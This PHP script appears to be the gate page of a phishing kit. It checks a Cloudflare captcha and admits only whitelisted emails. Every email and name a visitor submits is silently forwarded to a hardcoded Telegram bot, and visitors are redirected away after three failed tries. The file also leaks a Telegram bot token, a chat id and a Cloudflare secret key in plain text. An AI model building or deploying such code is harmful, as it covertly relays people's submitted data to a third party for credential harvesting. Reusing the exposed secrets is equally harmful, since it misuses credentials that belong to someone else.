<?php
session_start();
define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');

// --- Telegram Config ---
$telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
$telegram_chat_id   = "6915371044";

// --- Whitelist file ---
$whitelist_file = __DIR__ . '/whitelist.txt';
$whitelist_emails = file_exists($whitelist_file) ? file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];

// Validate Turnstile
$turnstile_response = $_POST['cf-turnstile-response'] ?? '';
$secret_key = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc"; // Cloudflare secret key

$verify = file_get_contents("https://challenges.cloudflare.com/turnstile/v0/siteverify", false, stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query([
            'secret' => $secret_key,
            'response' => $turnstile_response,
            'remoteip' => $_SERVER['REMOTE_ADDR']
        ])
    ]
]));
$result = json_decode($verify, true);
if (empty($result['success'])) {
    $_SESSION['error_message'] = "Captcha verification failed.";
    header("Location: index.php");
    exit;
}

// Sanitize input
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
$name  = filter_input(INPUT_POST, 'name', FILTER_SANITIZE_FULL_SPECIAL_CHARS);

// Email whitelist check
if (!$email || !in_array(strtolower($email), array_map('strtolower', $whitelist_emails))) {
    $_SESSION['error_message'] = "Email is not authorized.";
    header("Location: index.php");
    exit;
}

// Store email in session
$_SESSION['old_email'] = $email;

// Ensure attempts.json exists
if (!file_exists(ATTEMPTS_FILE)) {
    file_put_contents(ATTEMPTS_FILE, json_encode([], JSON_PRETTY_PRINT));
}

$attempts = json_decode(file_get_contents(ATTEMPTS_FILE), true);
if (!is_array($attempts)) $attempts = [];

// Update attempts
if (!isset($attempts[$email])) {
    $attempts[$email] = ['names' => [$name], 'count' => 1];
} else {
    $attempts[$email]['names'][] = $name;
    $attempts[$email]['count'] += 1;
}

file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));

$attempt_number = $attempts[$email]['count'];
$correct_name = "John Doe"; // replace with actual

// Telegram notification (all attempts)
$telegram_message = "Login attempts for $email:\n";
$telegram_message .= "Names tried: " . implode(", ", $attempts[$email]['names']) . "\n";
$telegram_message .= "Total attempts: " . $attempts[$email]['count'];

$telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
@file_get_contents($telegram_url . "?chat_id=$telegram_chat_id&text=" . urlencode($telegram_message));

// Three-strike logic
if ($name !== $correct_name && $attempt_number < 3) {
    $_SESSION['error_message'] = "Incorrect name entered.";
    header("Location: index.php");
    exit;
}

if ($name !== $correct_name && $attempt_number >= 3) {
    header("Location: https://example.com/blocked");
    exit;
}

// Success
unset($_SESSION['old_email']);
header("Location: dashboard.php");
exit;
?>
